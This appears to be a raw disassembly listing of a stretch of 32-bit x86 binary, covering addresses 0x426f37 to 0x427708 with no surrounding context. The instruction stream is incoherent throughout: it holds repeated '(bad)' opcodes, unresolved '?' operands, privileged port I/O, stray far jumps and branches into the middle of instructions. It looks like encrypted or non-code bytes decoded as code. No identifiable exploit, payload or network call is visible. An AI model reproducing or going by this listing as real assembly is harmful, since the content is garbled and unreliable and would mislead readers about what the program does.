  426f37:	lock pop ebx
  426f39:	sub    al,cl
  426f3b:	or     BYTE PTR [ebx-0xe],dl
  426f3e:	rol    DWORD PTR [ebx],cl
  426f40:	pop    ebx
  426f41:	hlt    
  426f42:	fdiv   st,st(3)
  426f44:	push   ebx
  426f45:	stos   BYTE PTR es:[edi],al
  426f46:	inc    edx
  426f47:	or     BYTE PTR [ebx-0x1e],bl
  426f4a:	rol    DWORD PTR [ecx],cl
  426f4c:	(bad)  
  426f4d:	pop    ss
  426f4e:	aam    0x88
  426f50:	and    eax,0x297b8273
  426f55:	xchg   ax,ax
  426f57:	dec    eax
  426f58:	sub    DWORD PTR [edi],0x9320fb0f
  426f5e:	sar    edx,cl
  426f60:	sub    bh,dl
  426f62:	aam    0xe7
  426f64:	xchg   edx,eax
  426f65:	mov    ?,WORD PTR [edi-0x5]
  426f68:	sahf   
  426f69:	cmp    al,0xf
  426f6b:	mov    dl,0x32
  426f6d:	sub    cl,ah
  426f6f:	jae    0x426f71
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [eax],al
  426f75:	cmp    eax,0x2d1ff833
  426f7a:	and    edi,eax
  426f7c:	add    esi,esi
  426f7e:	(bad)  
  426f7f:	jg     0x426f81
  426f81:	pop    esi
  426f82:	add    esi,DWORD PTR [edi+0x6e5ae882]
  426f88:	fld    DWORD PTR [esi+0x78]
  426f8b:	fdivr  QWORD PTR [ebx-0x6]
  426f8e:	mov    ebp,0x59f3db38
  426f93:	push   ecx
  426f94:	call   0x778d:0x6f3a784b
  426f9b:	mov    esp,0x14cdfa5b
  426fa0:	and    DWORD PTR [eax+0x32c96e7a],0xffffffd2
  426fa7:	mov    cl,0x6b
  426fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426faa:	jo     0x426fbe
  426fac:	sbb    DWORD PTR [edx],0x14
  426faf:	or     bh,cl
  426fb1:	and    cl,BYTE PTR [esp+ebx*4+0xedfe57]
  426fb8:	(bad)  
  426fb9:	mov    al,0x52
  426fbb:	cwde   
  426fbc:	fcmovu st,st(2)
  426fbe:	xor    bh,0x82
  426fc1:	out    dx,al
  426fc2:	mov    DWORD PTR [eax+eax*4],ebp
  426fc5:	clc    
  426fc6:	inc    edx
  426fc7:	push   ebp
  426fc8:	adc    edx,esi
  426fca:	(bad)
  426fcd:	cmp    BYTE PTR [esi+0x5c],al
  426fd0:	(bad)  
  426fd1:	jne    0x426fd9
  426fd3:	jo     0x426f9d
  426fd5:	into   
  426fd6:	mov    esp,DWORD PTR [eax+edi*2]
  426fd9:	add    BYTE PTR [eax],al
  426fdb:	add    BYTE PTR [eax],al
  426fdd:	add    BYTE PTR [ebp+edi*4-0x34],dh
  426fe1:	mov    es,WORD PTR [eax+0x6]
  426fe4:	pop    esi
  426fe5:	loopne 0x426fa5
  426fe7:	imul   edx,DWORD PTR [edx-0x80],0xd86e779e
  426fee:	mov    edx,0x9c743c03
  426ff3:	(bad)  [ebx-0x6182717e]
  426ff9:	clc    
  426ffa:	jns    0x426fe8
  426ffc:	out    0xe1,al
  426ffe:	xchg   ebx,eax
  426fff:	cmp    DWORD PTR [eax],eax
  427001:	mov    edx,0x2488e4b6
  427006:	test   eax,esp
  427008:	add    esi,DWORD PTR [ebp+ebp*1+0xb]
  42700c:	push   eax
  42700d:	pop    esi
  42700e:	pop    ebp
  42700f:	jmp    DWORD PTR [ecx+0x28]
  427012:	mov    ebx,0x5560620a
  427017:	or     eax,ebp
  427019:	rcl    BYTE PTR [ebx+edi*2],1
  42701c:	sti    
  42701d:	gs mov dh,0xee
  427020:	adc    dh,BYTE PTR [esi]
  427022:	sub    eax,0xcab4fb6b
  427027:	jnp    0x42709e
  427029:	icebp  
  42702a:	mov    ss,ebx
  42702c:	cdq    
  42702d:	push   ds
  42702e:	idiv   DWORD PTR [ebp-0x40]
  427031:	popf   
  427032:	jge    0x42705b
  427034:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427036:	fwait
  427037:	js     0x427067
  427039:	push   esp
  42703b:	in     al,dx
  42703c:	fist   DWORD PTR [ecx]
  42703e:	pop    ebp
  42703f:	enter  0xf6f9,0x0
  427043:	add    BYTE PTR [eax],al
  427045:	add    BYTE PTR [eax],al
  427047:	add    BYTE PTR [edi+eiz*8-0x15],al
  42704b:	mov    ds:0xc0475b42,eax
  427050:	dec    ecx
  427051:	mov    esi,0xc92876f1
  427056:	ret    0x517d
  427059:	call   0x1eca72d
  42705e:	cmp    eax,0x5547f41
  427063:	ins    DWORD PTR es:[edi],dx
  427064:	in     al,0x88
  427066:	jmp    0x427069
  427068:	mov    esi,0x9fee123
  42706d:	mov    esi,0x86cd76f1
  427072:	(bad)  
  427073:	lock gs or al,0x3a
  427077:	scas   eax,DWORD PTR es:[edi]
  427078:	shl    DWORD PTR [ebp+0x31],cl
  42707b:	fwait
  42707c:	(bad)  
  42707d:	cli    
  42707e:	add    cl,al
  427080:	repnz rol DWORD PTR [ebx-0x74],0x85
  427085:	clc    
  427086:	mov    eax,DWORD PTR ds:0x4ed41584
  42708c:	inc    edx
  42708d:	sti    
  42708e:	mov    bh,BYTE PTR [ebp+edi*2+0x72d00fee]
  427095:	add    BYTE PTR [eax],al
  427097:	pop    esp
  427098:	jg     0x427117
  42709a:	or     BYTE PTR [ecx+ecx*4+0x16],bl
  42709e:	data16 (bad) 
  4270a0:	or     ebx,DWORD PTR [esi-0x77]
  4270a3:	adc    cl,BYTE PTR [edx]
  4270a5:	pop    es
  4270a6:	mov    bh,0xe3
  4270a8:	std    
  4270a9:	mov    ebp,0x45
  4270ae:	add    BYTE PTR [eax],al
  4270b0:	pop    ebx
  4270b1:	(bad)  
  4270b2:	pop    ebp
  4270b3:	mov    edx,edx
  4270b5:	pop    es
  4270b6:	pop    es
  4270b7:	test   bh,cl
  4270b9:	add    BYTE PTR [eax],al
  4270bb:	add    BYTE PTR [ebx],bl
  4270bd:	mov    ebx,0x50cc0846
  4270c2:	dec    edx
  4270c3:	jmp    DWORD PTR [ecx]
  4270c5:	loop   0x4270d6
  4270c7:	inc    eax
  4270c8:	or     al,0x7d
  4270ca:	shl    BYTE PTR [ebp+eax*8+0x51],0x63
  4270cf:	sub    ch,bl
  4270d1:	add    DWORD PTR [eax],eax
  4270d3:	inc    DWORD PTR [ecx+0x6]
  4270d6:	lea    eax,[esi-0x20]
  4270d9:	push   ecx
  4270da:	mov    WORD PTR [ebp-0x2c],es
  4270dd:	push   ecx
  4270de:	dec    edx
  4270df:	call   0x39f0b4
  4270e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270e5:	jmp    FWORD PTR [edx]
  4270e7:	rol    BYTE PTR [ebp+0x4b],0xb
  4270eb:	test   esp,ebx
  4270ed:	adc    al,BYTE PTR [esp+ecx*1-0x74fffe63]
  4270f4:	pop    ecx
  4270f5:	push   es
  4270f6:	pop    esi
  4270f7:	mov    edx,DWORD PTR [ebx+0x10]
  4270fa:	pop    es
  4270fb:	mov    bh,0x75
  4270fd:	sbb    eax,0x83b4620c
  427102:	add    al,0x88
  427104:	cmp    edi,DWORD PTR [ebx+0x64b5b210]
  42710a:	mov    al,0xc1
  42710c:	cld    
  42710d:	and    al,0x10
  42710f:	test   al,0x76
  427111:	outs   dx,DWORD PTR ds:[esi]
  427112:	or     DWORD PTR [edi+0x0],edi
  427115:	add    BYTE PTR [eax],al
  427117:	add    BYTE PTR [eax],al
  427119:	push   ebp
  42711a:	fild   WORD PTR [ebx-0x370d8e40]
  427120:	or     edi,edi
  427122:	mov    ds:0xbab8d11,eax
  427127:	mov    edi,?
  427129:	in     al,dx
  42712a:	mov    ds:0xab38811,eax
  42712f:	inc    esi
  427130:	inc    edx
  427131:	push   edi
  427132:	imul   ebp,ecx,0x7e
  427135:	stos   BYTE PTR es:[edi],al
  427136:	push   ebp
  427137:	pop    es
  427138:	or     ecx,DWORD PTR [eax]
  42713a:	sub    eax,DWORD PTR [edi-0x1a8a9be]
  427140:	je     0x4270e1
  427142:	pop    esp
  427143:	mov    eax,0x76e87b43
  427148:	adc    BYTE PTR [eax+0x6d454854],cl
  42714e:	imul   edi,ebx,0xffffffff
  427151:	repnz and eax,edx
  427154:	not    ebp
  427156:	addr16 (bad) 
  427158:	(bad)  
  427159:	mov    edx,0x751b7825
  42715e:	imul   edi,edi,0xffffffe6
  427161:	outs   dx,DWORD PTR ds:[esi]
  427162:	call   0x6e8291e2
  427167:	inc    edx
  427168:	inc    ebp
  427169:	ins    DWORD PTR es:[edi],dx
  42716a:	imul   edi,edi,0xfffffffa
  42716d:	jne    0x42710b
  42716f:	leave  
  427170:	div    DWORD PTR [ebp-0x54]
  427173:	add    al,0x0
  427175:	mov    dl,0x1d
  427177:	js     0x427174
  427179:	jne    0x42717d
  42717b:	jmp    0x427183
  427180:	add    BYTE PTR [eax],al
  427182:	call   0x2164042
  427187:	mov    esp,0xbef3d3cc
  42718c:	loopne 0x4271f9
  42718e:	test   eax,0xe87f8273
  427193:	mov    ebx,0xbd01d3cd
  427198:	retf   0xf3d3
  42719b:	mov    ebp,0x75396c70
  4271a0:	bound  edi,QWORD PTR [edi-0x18]
  4271a3:	mov    esp,0xbd01d40c
  4271a8:	add    ah,dl
  4271aa:	repz mov ebp,0x75096c54
  4271b0:	inc    edx
  4271b1:	jg     0x427186
  4271b3:	adc    dl,BYTE PTR [esi-0x66ce4870]
  4271b9:	imul   ebx,DWORD PTR [ecx],0xffffffd3
  4271bc:	sub    bh,BYTE PTR [edi-0x5]
  4271bf:	mov    esp,0xc1b78bd8
  4271c4:	jmp    0xe24b297f
  4271c9:	scas   al,BYTE PTR es:[edi]
  4271ca:	mov    bh,0x6
  4271cc:	and    eax,esi
  4271ce:	inc    esi
  4271cf:	add    DWORD PTR [esp+eax*2-0x7f],ebp
  4271d3:	std    
  4271d4:	adc    dl,ah
  4271d6:	inc    edx
  4271d7:	je     0x4271cb
  4271d9:	mov    WORD PTR [edi],?
  4271db:	sbb    ah,BYTE PTR [esp+eax*2+0x69]
  4271df:	or     al,0xe2
  4271e1:	cmc    
  4271e2:	push   0x73
  4271e4:	adc    edi,DWORD PTR [edi+0x0]
  4271e7:	add    BYTE PTR [eax],al
  4271e9:	add    BYTE PTR [eax],al
  4271eb:	push   0xcac3f95a
  4271f0:	mov    ah,BYTE PTR [ebx]
  4271f2:	or     al,bh
  4271f4:	inc    edx
  4271f5:	cmp    eax,0xb9bdb708
  4271fa:	add    al,0x46
  4271fc:	push   0x0
  4271fe:	cmp    eax,ecx
  427200:	jns    0x4271fd
  427202:	imul   esi,DWORD PTR [ebp+0x77],0x77801c00
  427209:	jb     0x427204
  42720b:	adc    ecx,DWORD PTR ds:0x73b6f9bc
  427211:	push   ebp
  427212:	adc    DWORD PTR [ebp+0x4786f9c3],0x53a78770
  42721c:	fst    DWORD PTR [esi-0x60]
  42721f:	mov    ah,0xfe
  427221:	jmp    FWORD PTR [ebp+0x68]
  427224:	(bad)  
  427225:	cli    
  427226:	pop    ds
  427227:	fimul  DWORD PTR ds:0x7336f9d8
  42722d:	cli    
  42722e:	fbld   TBYTE PTR [esi+0x77]
  427231:	adc    eax,0xffc2668d
  427236:	inc    ebp
  427237:	inc    eax
  427238:	pop    ss
  427239:	call   0xfbbbb935
  42723e:	and    BYTE PTR ss:[ebx],cl
  427241:	call   0xfbbbb945
  427246:	and    BYTE PTR es:[edi+0x7926c7e7],bh
  42724d:	sti    
  42724e:	mov    edi,0x0
  427253:	add    BYTE PTR [esi-0x7cf0afde],bl
  427259:	mov    bl,0x55
  42725b:	jb     0x4271e7
  42725d:	rcl    DWORD PTR [ecx-0x2],1
  427260:	jmp    0x4004:0x5adcfb06
  427267:	jmp    0xe967e45b
  42726c:	jbe    0x4272e5
  42726e:	add    BYTE PTR [edx+0x43],dh
  427271:	inc    ecx
  427272:	jmp    0x8783f070
  427277:	lahf   
  427278:	mul    BYTE PTR [eax+0x0]
  42727b:	add    BYTE PTR [ebx+0xa8afffd],dh
  427281:	mov    edi,0xc89710d9
  427286:	shr    al,0x94
  427289:	mov    edi,0xbfa708e0
  42728e:	mov    BYTE PTR [ebp-0x10],al
  427291:	dec    DWORD PTR [si-0x7da7]
  427296:	push   eax
  427297:	jmp    FWORD PTR [ecx+0x6]
  42729a:	call   0xf73782a9
  42729f:	test   BYTE PTR [ebx+ebp*2],bl
  4272a2:	adc    eax,DWORD PTR [ebp+0x560b6aea]
  4272a8:	sar    DWORD PTR [ecx+0x7],cl
  4272ab:	(bad)  
  4272ac:	cmp    esi,edi
  4272ae:	out    0xf6,eax
  4272b0:	imul   edi
  4272b2:	test   BYTE PTR [esp+ebx*4+0xafff6a],0x0
  4272ba:	add    BYTE PTR [eax],al
  4272bc:	add    BYTE PTR [ebp-0x25],cl
  4272bf:	stc    
  4272c0:	xor    DWORD PTR [eax+edx*2+0x624c2c8],ecx
  4272c7:	push   ebp
  4272c8:	mov    esi,DWORD PTR [eax+0xe7cec85]
  4272ce:	push   es
  4272cf:	add    BYTE PTR [ebx-0x59],dl
  4272d2:	push   ecx
  4272d3:	pop    es
  4272d4:	push   esi
  4272d5:	retf   
  4272d6:	jp     0x427355
  4272d8:	or     dh,dh
  4272da:	add    DWORD PTR [eax-0x5c],ebp
  4272dd:	out    0x45,eax
  4272df:	sti    
  4272e0:	push   esi
  4272e1:	fs mov esi,0x89f3ff92
  4272e7:	ror    BYTE PTR [edi],0x58
  4272ea:	out    dx,eax
  4272eb:	(bad)  
  4272ec:	dec    esp
  4272ee:	pop    ebp
  4272ef:	cmp    esi,DWORD PTR [edi+0x77]
  4272f2:	push   es
  4272f3:	bound  ecx,QWORD PTR [ecx+eiz*2]
  4272f6:	dec    eax
  4272f7:	ret    
  4272f8:	push   eax
  4272f9:	jne    0x42733e
  4272fb:	jno    0x427293
  4272fd:	ret    0x8340
  427300:	shr    BYTE PTR [edx-0x21],0x63
  427304:	add    esi,DWORD PTR [ebp+0x5b]
  427307:	jmp    0x8b4dc00f
  42730c:	dec    ebp
  42730d:	lods   eax,DWORD PTR ds:[esi]
  42730e:	or     dh,BYTE PTR [edi+0x41b1eb4]
  427314:	call   0xfbbc6d9c
  427319:	lock fwait
  42731b:	or     al,0x85
  42731d:	mov    al,0x68
  42731f:	(bad)  
  427320:	inc    DWORD PTR [eax]
  427322:	add    BYTE PTR [eax],al
  427324:	add    BYTE PTR [eax],al
  427326:	in     eax,dx
  427327:	push   ds
  427328:	dec    ebp
  427329:	mov    BYTE PTR [eax+0x6a7d8a8c],bh
  42732f:	out    0xc1,al
  427331:	retf   
  427332:	dec    ebp
  427333:	pushf  
  427334:	add    al,0x0
  427336:	jne    0x42732e
  427338:	stc    
  427339:	in     al,0x0
  42733b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42733c:	dec    edi
  42733d:	call   0x41d34f
  427342:	jb     0x4272dd
  427344:	ret    0x6ae4
  427347:	icebp  
  427348:	leave  
  427349:	cli    
  42734a:	fwait
  42734b:	sbb    bl,BYTE PTR [edi+0x8]
  42734e:	xchg   ebx,eax
  42734f:	fs ds or ebp,edx
  427353:	sbb    al,BYTE PTR [edx]
  427355:	std    
  427356:	sbb    DWORD PTR [eax],ebp
  427358:	jl     0x427313
  42735a:	jne    0x4273b8
  42735c:	(bad)  
  42735d:	call   DWORD PTR [ebx-0x5f4c1ac]
  427363:	into   
  427364:	add    eax,DWORD PTR [eax]
  427366:	jne    0x42735c
  427368:	pop    es
  427369:	jg     0x4273c3
  42736b:	adc    edi,edi
  42736d:	cs jmp 0x8a8b:0x3ae7c1e5
  427375:	push   ebp
  427376:	leave  
  427377:	add    DWORD PTR [eax-0x7],esi
  42737a:	fidiv  WORD PTR [eax+0x36]
  42737d:	add    dl,dh
  42737f:	mov    ah,0x8f
  427382:	lods   eax,DWORD PTR ds:[esi]
  427383:	jl     0x42733e
  427385:	inc    ebp
  427386:	rcl    DWORD PTR [ecx],cl
  427388:	push   0x65
  42738d:	add    BYTE PTR [eax],al
  42738f:	jne    0x427393
  427391:	mov    edx,0x5e3c7204
  427396:	push   esp
  427397:	fild   WORD PTR [ecx]
  427399:	stos   BYTE PTR es:[edi],al
  42739a:	add    al,0x75
  42739c:	and    eax,0x119545bb
  4273a1:	out    dx,al
  4273a2:	push   ebx
  4273a3:	adc    eax,DWORD PTR [esi]
  4273a5:	shl    DWORD PTR fs:[edx-0x4bf37fbe],0x63
  4273ad:	icebp  
  4273ae:	shr    DWORD PTR [edi-0xa],cl
  4273b1:	lock push cs
  4273b3:	xor    edi,DWORD PTR [edx+0x24]
  4273b6:	fs dec ebp
  4273b8:	jno    0x427409
  4273ba:	jnp    0x42741a
  4273bc:	xchg   DWORD PTR [ecx],ebp
  4273be:	icebp  
  4273bf:	jbe    0x427344
  4273c1:	lods   al,BYTE PTR ds:[esi]
  4273c2:	addr16 dec esi
  4273c4:	jl     0x427372
  4273c6:	addr16 ret 0xe95a
  4273ca:	or     dh,cl
  4273cc:	adc    dl,ch
  4273ce:	add    esi,DWORD PTR [ebp-0x46]
  4273d1:	jmp    0xe949ff56
  4273d6:	add    ecx,DWORD PTR [ebp+0x751eb1c2]
  4273dc:	xlat   BYTE PTR ds:[ebx]
  4273dd:	ins    DWORD PTR es:[edi],dx
  4273de:	stc    
  4273df:	jp     0x42745e
  4273e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273e2:	jp     0x427389
  4273e4:	pop    edx
  4273e5:	neg    BYTE PTR [ebp+0x44656ffe]
  4273eb:	outs   dx,BYTE PTR ds:[esi]
  4273ec:	xchg   cl,dh
  4273ee:	add    dh,BYTE PTR [ebp+0x2]
  4273f1:	imul   edi,ecx,0x0
  4273f7:	add    bh,ch
  4273f9:	add    al,BYTE PTR [eax]
  4273fb:	bound  esi,QWORD PTR [edx-0x5]
  4273fe:	xchg   esp,eax
  4273ff:	sub    ebx,DWORD PTR [esi-0x41]
  427402:	pop    es
  427403:	ins    DWORD PTR es:[edi],dx
  427404:	ss sti 
  427406:	adc    ebp,0x74
  427409:	add    al,BYTE PTR [eax]
  42740b:	bound  esi,QWORD PTR [ebx-0x11]
  42740e:	fs leave 
  427410:	jbe    0x42748f
  427412:	inc    ebp
  427413:	jno    0x4273db
  427415:	jle    0x42746c
  427417:	leave  
  427418:	das    
  427419:	mov    edi,0x852e620b
  42741e:	leave  
  42741f:	ficomp WORD PTR [edx]
  427421:	pop    eax
  427422:	add    ch,cl
  427424:	jbe    0x427491
  427426:	jne    0x427421
  427428:	std    
  427429:	lds    eax,FWORD PTR [edi-0x4947a7f]
  42742f:	mov    gs,ebx
  427431:	dec    edx
  427432:	test   DWORD PTR [edx-0x183a7981],esp
  427438:	jbe    0x42743c
  42743a:	sti    
  42743b:	cld    
  42743c:	(bad)  
  42743d:	imul   edx,DWORD PTR ds:0xffc2807d,0xfffffff5
  427444:	add    al,0xc7
  427446:	or     BYTE PTR [edx-0x32],dh
  427449:	in     al,0x86
  42744b:	stos   BYTE PTR es:[edi],al
  42744c:	outs   dx,BYTE PTR ds:[esi]
  42744d:	in     al,0xc0
  42744f:	dec    ecx
  427450:	outs   dx,BYTE PTR ds:[esi]
  427451:	in     al,0x6
  427453:	sub    BYTE PTR [edx+edi*2],dl
  427456:	inc    ebp
  427457:	pop    ebp
  427458:	adc    al,0x88
  42745a:	aas    
  42745b:	jecxz  0x42745d
  42745d:	add    BYTE PTR [eax],al
  42745f:	add    BYTE PTR [eax],al
  427461:	outs   dx,DWORD PTR ds:[esi]
  427462:	mov    ah,0x47
  427464:	loop   0x42747a
  427466:	inc    edx
  427467:	loopne 0x42745a
  427469:	adc    al,0x8
  42746b:	rol    DWORD PTR [edi+0x6299c4f9],0xb7
  427472:	and    eax,0x27fe900
  427477:	xchg   DWORD PTR [eax],eax
  427479:	stos   DWORD PTR es:[edi],eax
  42747a:	(bad)  
  42747b:	call   0x83085b90
  427480:	iret   
  427481:	(bad)  
  427482:	out    0xf,al
  427484:	mov    eax,DWORD PTR [ebx+0x60bce28]
  42748a:	ret    
  42748b:	out    0x8,eax
  42748d:	sbb    eax,0xd0b07e3
  427492:	jnp    0x4274d9
  427494:	mov    al,0x36
  427496:	push   ss
  427497:	lea    eax,[ebx+0x7c]
  42749a:	push   esi
  42749b:	mov    WORD PTR [ebp-0x4],es
  42749e:	push   ebp
  42749f:	jecxz  0x4274d0
  4274a1:	pop    edx
  4274a2:	in     al,dx
  4274a3:	mul    BYTE PTR [esi-0x33]
  4274a6:	scas   al,BYTE PTR es:[edi]
  4274a7:	lahf   
  4274a8:	or     BYTE PTR [edx-0x7b59bb3d],al
  4274ae:	pusha  
  4274af:	rol    BYTE PTR [ebp+0x34],0xfe
  4274b3:	popa   
  4274b4:	sbb    BYTE PTR [ecx],bl
  4274b6:	scas   eax,DWORD PTR es:[edi]
  4274b7:	xchg   edi,eax
  4274b8:	push   eax
  4274b9:	sti    
  4274ba:	pop    ebp
  4274bb:	add    ebp,eax
  4274bd:	push   ecx
  4274be:	nop
  4274bf:	idiv   edi
  4274c1:	rol    dh,1
  4274c3:	push   es
  4274c4:	test   BYTE PTR [eax],al
  4274c6:	add    BYTE PTR [eax],al
  4274c8:	add    BYTE PTR [eax],al
  4274ca:	xor    al,0x4
  4274cc:	add    BYTE PTR [eax],al
  4274ce:	loope  0x4274bb
  4274d0:	jae    0x4274e6
  4274d2:	add    ebp,ebx
  4274d4:	je     0x4274b6
  4274d6:	stos   DWORD PTR es:[edi],eax
  4274d7:	pop    ebp
  4274d8:	add    ebp,eax
  4274da:	jns    0x427465
  4274dc:	idiv   edi
  4274de:	mov    al,ds:0x4c8406c6
  4274e3:	add    al,0x0
  4274e5:	add    BYTE PTR [edi-0x33e9bfcb],dl
  4274eb:	add    DWORD PTR [eax+0x65bff],edi
  4274f1:	mov    esi,0x66b
  4274f6:	jne    0x4274d8
  4274f8:	dec    ebx
  4274f9:	push   edx
  4274fa:	xchg   ebx,eax
  4274fb:	loop   0x4274b7
  4274fd:	(bad)  
  4274fe:	add    bh,bl
  427500:	mov    edi,edx
  427502:	jmp    0xbb1d:0x32ffed6c
  427509:	xlat   BYTE PTR ds:[ebx]
  42750a:	jne    0x427491
  42750c:	xchg   BYTE PTR [ebp-0x54],cl
  42750f:	fs push eax
  427511:	push   edx
  427512:	xchg   BYTE PTR [ebp-0x7e],dl
  427515:	test   ebp,ebp
  427517:	push   esi
  427518:	js     0x427515
  42751a:	and    ebp,DWORD PTR [ebx]
  42751c:	jns    0x4274f1
  42751e:	neg    BYTE PTR [edi+0x43208917]
  427524:	xchg   BYTE PTR [ebp-0x6f],dh
  427527:	fdiv   st,st(1)
  427529:	div    DWORD PTR [ebp+0x4c]
  42752c:	sbb    ecx,0x0
  427532:	add    BYTE PTR [ebp+0x5b],dh
  427535:	jmp    DWORD PTR [ebp+0x75]
  427538:	adc    ebp,DWORD PTR [eax]
  42753a:	add    DWORD PTR [ebp+0x5b],esi
  42753d:	add    BYTE PTR [ebp+0x6d],0x2b
  427541:	xor    eax,0x9c2d5dc0
  427546:	sti    
  427547:	push   0xffffffd8
  427549:	jbe    0x427546
  42754b:	jb     0x42752b
  42754d:	mov    eax,0x785b7500
  427552:	adc    eax,0xffbf6e31
  427557:	mov    DWORD PTR [edi+0x64750020],ebx
  42755d:	jp     0x4274e8
  42755f:	jo     0x4275bc
  427561:	(bad)  
  427562:	jle    0x427514
  427564:	dec    edi
  427565:	push   DWORD PTR [ebx+0x7e]
  427568:	push   ecx
  427569:	js     0x427566
  42756b:	test   al,0x4f
  42756d:	js     0x427584
  42756f:	push   ebp
  427570:	dec    eax
  427571:	mov    edi,0xac01ffff
  427576:	pop    es
  427577:	repnz stc 
  427579:	sbb    ebx,edx
  42757b:	jb     0x4275f6
  42757d:	xchg   esp,eax
  42757e:	jnp    0x4275fa
  427580:	out    0xf8,eax
  427582:	add    edi,eax
  427584:	ins    BYTE PTR es:[edi],dx
  427585:	jge    0x427579
  427587:	imul   esp,edi,0x10
  42758a:	add    ebx,DWORD PTR [edx+0x6d]
  42758d:	loopne 0x42751b
  42758f:	xor    BYTE PTR [esi+0x5e],bl
  427592:	(bad)  
  427593:	fidivr DWORD PTR [esi+0x1d]
  427596:	add    eax,0x0
  42759b:	add    BYTE PTR [edi-0x7f],dl
  42759e:	pop    ebx
  42759f:	add    DWORD PTR [ebp-0xc],esi
  4275a2:	sbb    eax,0xe1ec3bde
  4275a7:	add    esp,DWORD PTR [edi]
  4275a9:	(bad)  
  4275aa:	sbb    dh,BYTE PTR [edi+0x20]
  4275ad:	cli    
  4275ae:	ins    DWORD PTR es:[edi],dx
  4275af:	inc    ebx
  4275b0:	lea    ecx,[edx+edi*4-0x4e7f6189]
  4275b7:	ja     0x427637
  4275b9:	xchg   dh,bh
  4275bb:	add    BYTE PTR [ebp+0x2],dh
  4275be:	fs inc esp
  4275c0:	outs   dx,BYTE PTR ds:[esi]
  4275c1:	xchg   dh,dh
  4275c3:	add    BYTE PTR [ebp+0x2],dh
  4275c6:	data16 jl 0x42763d
  4275c9:	cmc    
  4275ca:	lds    ecx,FWORD PTR [edx+0x3b2912b0]
  4275d0:	mov    eax,0x5e11fc6a
  4275d5:	mov    esi,0xfa5e8370
  4275da:	ins    DWORD PTR es:[edi],dx
  4275db:	inc    edi
  4275dc:	clc    
  4275dd:	cmc    
  4275de:	dec    esp
  4275df:	ins    BYTE PTR es:[edi],dx
  4275e0:	inc    ebx
  4275e1:	mov    eax,0xfb527752
  4275e6:	mov    esi,0x925ac70c
  4275eb:	leave  
  4275ec:	sub    al,0x6c
  4275ee:	cmp    al,cl
  4275f0:	jb     0x427669
  4275f2:	add    BYTE PTR [esi+eax*4-0x7fbebb15],ch
  4275f9:	xor    eax,DWORD PTR [ebp+0x21]
  4275fc:	pop    es
  4275fd:	xchg   edx,eax
  4275fe:	jg     0x42759c
  427600:	add    BYTE PTR [eax],al
  427602:	add    BYTE PTR [eax],al
  427604:	add    BYTE PTR [edx+0x2],dh
  427607:	or     ebp,DWORD PTR [ebp+0x4e]
  42760a:	addr16 sti 
  42760c:	push   cs
  42760d:	push   0xfffffff5
  42760f:	adc    eax,DWORD PTR [esi]
  427611:	test   BYTE PTR [esi+0x5976a90e],cl
  427617:	sbb    eax,0x876763f6
  42761c:	ins    BYTE PTR es:[edi],dx
  42761d:	jle    0x4275f9
  42761f:	aas    
  427620:	pop    esi
  427621:	outs   dx,BYTE PTR ds:[esi]
  427622:	add    ah,BYTE PTR [esi-0x18]
  427625:	in     eax,dx
  427626:	(bad)  
  427629:	dec    ecx
  42762a:	jno    0x4275bf
  42762c:	into   
  42762d:	sub    eax,DWORD PTR [esi+0x412af6c0]
  427633:	add    al,0xe9
  427635:	jbe    0x42762e
  427637:	mov    cl,0x2c
  427639:	and    ch,bl
  42763b:	out    0xe9,eax
  42763d:	jnp    0x4275c5
  42763f:	sbb    al,0xed
  427641:	jbe    0x427645
  427643:	dec    eax
  427644:	xor    DWORD PTR [edx-0x7a],edi
  427647:	(bad)
  42764a:	add    cl,BYTE PTR [eax-0x22]
  42764d:	repnz sbb eax,0xba76e8fe
  427653:	or     ah,BYTE PTR [ebp-0x53]
  427656:	add    DWORD PTR [eax],eax
  427658:	jmp    0x4ac66e8b
  42765d:	jbe    0x427661
  42765f:	add    BYTE PTR [ecx-0x1a6f7a8d],dh
  427665:	jbe    0x427669
  427667:	push   0xa9
  42766c:	add    BYTE PTR [eax],al
  42766e:	dec    ebx
  42766f:	adc    al,0x0
  427671:	ret    
  427672:	ja     0x4276f1
  427674:	inc    ebp
  427675:	add    ah,cl
  427677:	dec    edi
  427678:	jecxz  0x427622
  42767a:	retf   
  42767b:	hlt    
  42767c:	test   BYTE PTR [esp+ecx*2+0x18788404],0xff
  427684:	jmp    DWORD PTR [edi-0x24]
  427687:	pop    ebx
  427688:	adc    al,BYTE PTR [eax]
  42768a:	out    0x6a,al
  42768c:	mov    WORD PTR [ebp+0x48],es
  42768f:	dec    edi
  427690:	jecxz  0x427622
  427692:	imul   esi,esp,0xfffffff6
  427695:	test   BYTE PTR [esp+eax*1-0x1279f7c],bl
  42769c:	dec    DWORD PTR [edx-0x3e7cd4ef]
  4276a2:	mov    ecx,0xdcfefffe
  4276a7:	jns    0x42767a
  4276a9:	shl    DWORD PTR [esi+0x57c20315],0xcf
  4276b0:	shl    dl,0xac
  4276b3:	jg     0x427696
  4276b5:	add    BYTE PTR [ebx-0x2f4fffb],dh
  4276bb:	mov    esi,0xdfcd08e7
  4276c0:	pop    es
  4276c1:	or     ebx,esi
  4276c3:	jbe    0x42770a
  4276c5:	les    ebx,FWORD PTR [ebp+eax*1-0x7c]
  4276c9:	sub    DWORD PTR [eax+0x33e7fffe],ebx
  4276cf:	cmp    ecx,edi
  4276d1:	inc    DWORD PTR [eax]
  4276d3:	add    BYTE PTR [eax],al
  4276d5:	add    BYTE PTR [eax],al
  4276d7:	xlat   BYTE PTR ds:[ebx]
  4276d8:	out    dx,al
  4276d9:	test   dh,dh
  4276db:	arpl   dx,bp
  4276dd:	adc    DWORD PTR [esp+ecx*2],eax
  4276e0:	push   es
  4276e1:	push   0xb5b40
  4276e6:	dec    DWORD PTR [ecx+0x2a]
  4276e9:	dec    esi
  4276ea:	call   0x39ee86
  4276ef:	fdivr  DWORD PTR [esi+0x64758406]
  4276f5:	sti    
  4276f6:	push   DWORD PTR [edx]
  4276f8:	in     eax,0xba
  4276fa:	or     edi,esi
  4276fc:	xchg   BYTE PTR [ebx],bh
  4276fe:	xchg   DWORD PTR [ebp-0x6f],ebp
  427701:	je     0x427753
  427703:	jns    0x42768e
  427705:	addr16 mov al,0xbe
  427708:	sbb    DWORD PTR [ebp-0x17],esi
